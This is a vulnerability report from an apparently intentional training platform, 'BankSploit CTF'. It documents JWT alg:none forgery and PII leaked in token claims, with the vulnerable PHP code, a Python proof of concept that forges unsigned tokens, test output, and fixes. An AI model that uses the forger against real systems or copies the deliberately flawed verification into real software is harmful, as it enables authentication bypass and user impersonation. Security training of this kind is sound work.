# BankSploit JWT Vulnerability Report

## Executive Summary

The BankSploit CTF application contains two critical JWT-related vulnerabilities at vulnerability level 0:

1. **auth.l12**: JWT Algorithm Negotiation - Accepts `alg:none` (unsigned tokens)
2. **auth.l17**: Sensitive Data in JWT - Embeds PII (PAN, Aadhaar, Balance) in tokens

Both vulnerabilities are intentionally built into the training platform to teach security concepts.

---

## Vulnerability Details

### 1. auth.l12 - JWT Algorithm Vulnerability (CWE-347)

**Status**: CONFIRMED VULNERABLE at Level 0

#### Attack Vector
An attacker can forge JWTs without knowing the signing secret by setting `alg: "none"`.

#### How It Works

**Vulnerable Code** (`src/core/Auth.php:368-397`):
```php
public function verifyJWT(string $token): ?array
{
    $parts = explode('.', $token);
    if (count($parts) !== 3) {
        return null;
    }
    [$h, $p, $s] = $parts;
    $header = json_decode(self::b64urlDecode($h), true);
    $claims = json_decode(self::b64urlDecode($p), true);
    
    $alg = strtolower((string) ($header['alg'] ?? ''));
    
    if ($this->engine->isVulnerable('auth', 'l12')) {
        // VULNERABLE: trust alg=none, no signature check.
        if ($alg === 'none') {
            return $claims;  // <-- ACCEPTS UNSIGNED TOKEN
        }
    }
    // ... HS256 verification ...
}
```

#### Proof of Concept

```python
import json
import base64
import time

def forge_jwt_alg_none(customer_id, role='user'):
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "sub": customer_id,
        "role": role,
        "iat": time.time(),
        "exp": time.time() + 3600
    }
    
    def b64url(data):
        return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()
    
    return b64url(json.dumps(header)) + "." + b64url(json.dumps(payload)) + "."

# Forge a token
forged_token = forge_jwt_alg_none("BS100234", role="user")

# Use it in browser
# URL: http://localhost:9443/dashboard?access_token={forged_token}
```

#### Impact
- **Authentication Bypass**: Any attacker can forge valid JWTs
- **Privilege Escalation**: Can forge admin roles without credentials
- **User Impersonation**: Can impersonate any customer without their password

#### Test Results (Localhost)
```
[PHASE 4] JWT Forgery Test (alg=none)
[*] Forged token (alg=none): eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJzdWIiOi...
[VULN] Forged JWT (alg:none) ACCEPTED!
    -> Attacker can impersonate any user without credentials
```

#### Remediation
Set vulnerability level to 3 in the admin config. This forces:
- JWT generation with `alg: "HS256"`
- JWT verification requiring valid HMAC-SHA256 signature
- Rejection of `alg: "none"` tokens

**Secure Code** (`Level 3`):
```php
if ($this->engine->isVulnerable('auth', 'l12')) {
    // ... accept alg:none (vulnerable)
} else {
    // SECURE: only HS256 with a valid signature
    if ($alg !== 'hs256') {
        return null;  // Reject alg:none
    }
}
$expected = self::b64url(hash_hmac('sha256', "$h.$p", self::secret(), true));
return hash_equals($expected, $s) ? $claims : null;
```

---

### 2. auth.l17 - PII Information Disclosure in JWT

**Status**: CONFIRMED at Level 0 (but depends on OTP bypass)

#### Attack Vector
At vulnerability level 0, JWTs embed sensitive personal information that should never be in a token.

#### How It Works

**Vulnerable Code** (`src/modules/auth/api.php:108-128`):
```php
$claims = [
    'sub'  => $pending['customer_id'],
    'role' => $pending['role'],
    'iat'  => time(),
    'exp'  => time() + 3600,
];
if ($engine->isVulnerable('auth', 'l17')) {
    $extra = $pdo->prepare(
        'SELECT u.pan, u.aadhaar_masked, COALESCE(SUM(a.balance),0) AS balance
           FROM users u LEFT JOIN accounts a ON a.user_id = u.id
          WHERE u.id = :id GROUP BY u.id'
    );
    $extra->execute([':id' => (int) $pending['id']]);
    if ($row = $extra->fetch()) {
        $claims['pan']     = $row['pan'];
        $claims['aadhaar'] = $row['aadhaar_masked'];
        $claims['balance'] = (float) $row['balance'];
    }
}
```

#### Example Vulnerable JWT Payload
```json
{
    "sub": "BS100001",
    "role": "user",
    "iat": 1691234567,
    "exp": 1691238167,
    "pan": "1234-5678-9012-3456",
    "aadhaar": "XXXX-XXXX-1234",
    "balance": 250000.50
}
```

#### Impact
- **Information Disclosure**: Customer financial data exposed in token
- **Privacy Violation**: Sensitive identity information in memory/logs
- **Token Logging Risk**: Tokens may be logged in server logs, analytics, or error messages

#### Remediation
Set vulnerability level to 3. This removes sensitive claims:

**Secure Code** (`Level 3`):
```php
if (!$this->engine->isVulnerable('auth', 'l17')) {
    // Secure: strip PII, keep only minimal claims
    $claims = array_intersect_key($claims, array_flip(['sub', 'role', 'exp', 'iat']));
}
```

Result: Only `sub`, `role`, `exp`, `iat` claims remain in the token.

---

## Related Vulnerabilities

### auth.l10 - OTP Brute-force
- Allows bypassing OTP verification via brute-force
- Status: TESTABLE (depends on implementation)

### auth.l11 - OTP Leaked in HTML
- OTP may be leaked in page source or JavaScript
- Status: DETECTED in tests

### auth.g1 - SQLi in Login
- SQL injection in customer_id field
- Can bypass login entirely
- Status: CONFIRMED (SQLi login proceeded)

---

## Testing

### Run JWT Tests
```bash
python test_jwt_fixed.py
```

### Expected Output (Vulnerable - Level 0)
```
[VULN] SQLi login attempt proceeded (OTP screen reached)
    This indicates SQL injection vulnerability (auth.g1)

[VULN] Forged JWT (alg:none) ACCEPTED!
    -> Attacker can impersonate any user without credentials
```

### After Fixing to Level 3
```
[OK] SQLi login blocked - proper input validation in place
[SECURE] Forged JWT rejected - proper signature validation
```

---

## Configuration

### View Current Levels
- **Superadmin Portal**: http://localhost:8888 (instructor/instructor@123)
- **Admin Config**: http://localhost:9443/admin/config
- **Training Lab**: http://localhost:9443/training

### Set to Secure (Level 3)
```bash
# Via admin panel, change:
auth.l12 = 3  # Require HS256 signed JWT
auth.l17 = 3  # Remove PII from JWT
```

### Vuln Config File
```
~project/vuln_config.json
```

---

## References

### CWE Standards
- **CWE-347**: Improper Verification of Cryptographic Signature (JWT alg:none)
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor (PII in JWT)

### OWASP
- A04:2021 - Insecure Deserialization
- A05:2021 - Broken Access Control (JWT forgery)

### JWT Standards
- **RFC 7519**: JSON Web Token (JWT)
- **RFC 7518**: JSON Web Algorithms (JWA) - Section 3.6 (alg:none)

---

## Summary Table

| Vulnerability | Code | Status | Attack | Impact | Fix |
|---|---|---|---|---|---|
| JWT alg:none | auth.l12 | CONFIRMED | Forge JWT | Auth bypass | Set Level 3 |
| PII in JWT | auth.l17 | TESTABLE | Extract data | Info disclosure | Set Level 3 |
| SQLi in Login | auth.g1 | CONFIRMED | Bypass login | Full auth bypass | Set Level 3 |
| OTP Brute-force | auth.l10 | TESTABLE | Guess OTP | Bypass 2FA | Set Level 3 |
| OTP Leak in HTML | auth.l11 | DETECTED | Read source | OTP captured | Set Level 3 |

---

## Test Run: Localhost Results

```
================================================================================
BankSploit JWT Vulnerability Test (auth.l12 & auth.l17)
================================================================================
[*] Testing on localhost:9443

[PHASE 1] HTML Login Form & OTP Flow
[OK] Login page loaded
[!] Potential OTP leak detected in HTML response

[PHASE 2] Form-based Login (with SQL injection test)
[VULN] SQLi login attempt proceeded (OTP screen reached)
    This indicates SQL injection vulnerability (auth.g1)

[PHASE 4] JWT Forgery Test (alg=none)
[*] Forged token (alg=none): eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0...
[VULN] Forged JWT (alg:none) ACCEPTED!
    -> Attacker can impersonate any user without credentials

================================================================================
```

---

**Report Generated**: BankSploit CTF Platform  
**Test Platform**: Localhost (localhost:9443)  
**Current Level**: 0 (All vulnerabilities active)  
**Status**: Confirmed Working as Designed
